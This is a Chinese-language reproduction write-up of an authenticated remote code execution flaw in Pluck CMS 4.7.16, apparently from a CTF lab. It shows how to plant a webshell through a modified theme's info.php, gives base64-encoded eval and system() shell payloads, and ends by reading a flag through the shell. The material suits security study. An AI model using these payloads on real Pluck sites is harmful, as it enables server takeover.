## 1. 漏洞介绍
Pluck是一套使用PHP语言开发的内容管理系统（CMS）。
Pluck CMS 4.7.16 版本存在代码问题漏洞，该漏洞源于Pluck CMS 4.7.16版本存在远程 shell 上传执行漏洞。
在 Pluck 4.7.16 中，管理员用户可以在 /admin.php?action=themeinstall中使用主题上传功能来执行远程代码执行。也就是上传的主题中的 info.php 会被执行，所以可以在 info.php 中实现服务器写马或RCE等的操作。
## 2. 影响版本
Pluck CMS 4.7.16版本
## 3. 漏洞复现
开启环境后利用admin/admin登录，找到主题上传界面。
GitHub 下载主题 [redline-theme](https://github.com/billcreswell/redline-theme/archive/refs/heads/master.zip)，解压后修改 info.php。
### 3.1. info 写马
```php
<?php @eval($_POST["shell"]) ?>
/*base64 编码后*/
PD9waHAgQGV2YWwoJF9QT1NUWyJzaGVsbCJdKSA/Pg==
```

- 主题文件修改
```php
<?php
  file_put_contents('shell.php',base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWyJzaGVsbCJdKSA/Pg=='));
?>
```

- 主题修改后重新压缩【zip格式】上传，上传成功后切换主题。
![1.png](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308281650169.png)

![2.png](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308281651326.png)

![3.png](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308281651757.png)

![4.png](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308281652559.png)

### 3.2. info.php — RCE
```php
<?php system($_GET[cmd]);?>
PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8+
```

- 主题修改
```php
<?php
file_put_contents('shell.php',base64_decode('PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8+'));
?>
```

- 主题上传安装同理
- 获取flag
```php
http://eci-2zeehs3ye28jdhx2afbx.cloudeci1.ichunqiu.com/shell.php?cmd=cat /flag
```

![5.png](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308281652363.png)

